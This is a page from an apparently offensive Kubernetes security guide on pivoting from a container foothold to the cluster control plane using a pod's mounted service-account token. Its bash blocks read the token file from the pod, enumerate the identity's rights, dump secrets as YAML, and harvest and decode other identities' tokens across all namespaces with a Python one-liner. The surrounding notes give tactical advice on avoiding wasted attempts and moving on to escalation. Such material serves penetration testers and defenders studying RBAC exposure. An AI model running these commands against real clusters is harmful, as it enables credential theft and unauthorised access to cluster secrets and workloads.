---
title: "Service account token to API: acting on the cluster with a pod identity"
order: 4
description: "A pod's service-account token authenticates to the API server. The attacker enumerates exactly what that identity may do with SelfSubjectRulesReview, then exercises it: reading secrets, listing workloads, or using an escalation verb. This is the pivot from a container foothold to operating against the cluster control plane as the pod's identity."
keywords:
  - service account token
  - api server
  - bearer token
  - can-i
  - lateral movement
---

# Service account token to API

The token mounted into every pod is a bearer credential for the API server, and using it is the first lateral step from a container foothold to the control plane. The move is to authenticate with the token, enumerate the identity's rights precisely, and then exercise whatever those rights permit, whether reading secrets, listing workloads to plan further movement, or invoking an escalation verb.

```bash
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# what can this identity do?
kubectl --token="$T" --certificate-authority="$C" --server="$APISERVER" auth can-i --list
# exercise it: read secrets in a namespace the token can reach
kubectl --token="$T" --certificate-authority="$C" --server="$APISERVER" \
  -n <ns> get secrets -o yaml
```

## Turning rights into movement

```bash
# list workloads to map targets and find more tokens
kubectl --token="$T" ... get pods,deploy,sa -A
# if the identity can read secrets, harvest tokens for other identities
kubectl --token="$T" ... get secrets -A -o json | \
  python3 -c 'import sys,json,base64;[print(base64.b64decode(s["data"]["token"]).decode()[:50]) for s in json.load(sys.stdin)["items"] if s.get("data",{}).get("token")]'
```

## Exploitation notes

- `auth can-i --list` first, always: it defines the identity's reach and tells you which of reading secrets, creating pods, or an escalation verb is available, so you do not waste attempts.
- A default service account with no bindings can still do cluster discovery (list some resources) in many clusters; even that maps targets for the next move.
- When the rights include an escalation verb, continue into the [RBAC privilege escalation](../rbac-privilege-escalation/index.md) group rather than only moving sideways.

## References

- [Kubernetes: authenticating with service account tokens](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens)
- [Kubernetes: SelfSubjectRulesReview](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/self-subject-rules-review-v1/)
